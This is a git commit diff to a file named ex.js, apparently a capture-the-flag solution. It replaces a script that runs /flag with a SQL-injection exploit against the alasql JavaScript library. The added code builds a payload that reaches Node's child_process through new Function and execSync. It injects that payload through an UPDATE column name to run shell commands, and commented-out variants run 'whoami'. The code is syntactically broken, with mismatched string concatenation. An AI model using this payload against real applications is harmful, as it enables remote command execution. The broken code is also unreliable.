b737cb2ef2f2bbc92824415d6bcf932a2d4714f3
Massy-J1 <jyc0x09@gmail.com>
2026-04-01 18:18:27 +0900

    aa

--- ex.js
+++ ex.js
@@ -1,15 +1,24 @@
-const { spawn } = require('child_process');
+const alasql = require('alasql');
 
-const ls = spawn('/flag', []); 
+const genPayload = command => `
+new Function(
+    'return this.process.mainModule.require'
+)()('child_process').execSync(${JSON.stringify(command)})
+`;
 
-ls.stdout.on('data', (data) => {
-  console.log(`출력: ${data}`);
-});
 
-ls.stderr.on('data', (data) => {
-  console.error(`에러: ${data}`);
-});
+res = alasql(
+    // Initialize the database
+    'DROP TABLE IF EXISTS pwnx;' +
+    "CREATE TABLE pwnx(a STRING);" +
+    "INSERT INTO pwnx VALUES ('x');" +
+    "SELECT VALUE a FROM pwnx;";
 
-ls.on('close', (code) => {
-  console.log(`프로세스 종료 코드: ${code}`);
-});
+    // Code injection in four different ways
+    //`UPDATE i_am_a_table SET [0'+${genPayload(">&2 echo UPDATE pwned $(whoami)")}+']=42;`
+    `UPDATE i_am_a_table SET [0'+${genPayload(">&2 \"sh -c '/flag 2>&1 || true'\",{encoding:'utf8'}")}+']=42;`
+      
+    //`UPDATE i_am_a_table SET [a'+(r.a=new Function('return this.process.mainModule.require')()('child_process').execSync(\"sh -c '/flag 2>&1 || true'\",{encoding:'utf8'}))+']=42;`
+    
+    "SELECT VALUE a FROM pwnx;";
+);
